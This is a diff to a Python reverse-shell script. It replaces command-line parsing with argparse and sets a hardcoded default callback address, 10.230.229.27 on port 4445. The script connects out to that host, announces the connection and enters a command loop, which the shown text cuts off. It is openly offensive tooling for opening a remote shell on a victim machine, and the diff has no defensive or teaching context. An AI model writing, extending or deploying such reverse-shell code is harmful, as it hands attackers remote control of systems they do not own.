@@ -1,22 +1,21 @@
 import subprocess
 import socket
 import sys
+import argparse
 
-def usage():
-	print("shell.py server port")
-	sys.exit()
+HOST = '10.230.229.27'
+PORT = '4445'
 
-if len(sys.argv) != 3:
-	usage()
-	
-if sys.argv[1] == '-h':
-	usage()
-else:
-	host = sys.argv[1]
-	port = int(sys.argv[2])
+#Parse command line arguments using argparse
+parser = argparse.ArgumentParser(description="Create a reverse shell.")
+parser.add_argument('-s', action='store', default=HOST, metavar='server',
+                    help='IP address of server accepting reverse connection')
+parser.add_argument('-p', action='store', default=PORT, metavar='port',
+                    help='Listening port on server.')
+args = parser.parse_args()
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((host, port))
+sock.connect((args.s, int(args.p)))
 sock.send("[*] Connection recieved.")
 
 while True:
